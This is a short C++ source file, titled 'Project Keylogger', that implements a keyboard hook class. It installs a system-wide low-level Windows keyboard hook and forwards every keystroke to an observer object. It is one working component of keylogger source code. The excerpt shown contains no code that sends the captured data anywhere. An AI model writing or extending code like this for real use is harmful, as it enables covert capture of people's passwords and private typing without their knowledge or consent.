/**
 *							Project Keylogger
 */


#include					"keylogger_dll/KeyboardHook.h"

/**
 * KeyboardHook implementation
 */

KeyboardHook* g_keyboardHook = NULL;

KeyboardHook::KeyboardHook(const HookObserver& observer) : AHook::AHook(observer){
	g_keyboardHook = this;
}

/**
 * @return bool true if hook set succeeded
 */
const bool						KeyboardHook::setHook() {
	if ((_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, &keyboardhook, NULL, 0)) == NULL)
	{
		return false;
	}
	return true;
}

/**
 * @param int
 * @param LPARAM
 * @param WPARAM
 * @return LRESULT CALLBACK
 */
LRESULT CALLBACK			KeyboardHook::keyboardhook(int code, WPARAM wParam, LPARAM lParam) {
		g_keyboardHook->notify(code, wParam, lParam);
	return CallNextHookEx(NULL, code, wParam, lParam);
}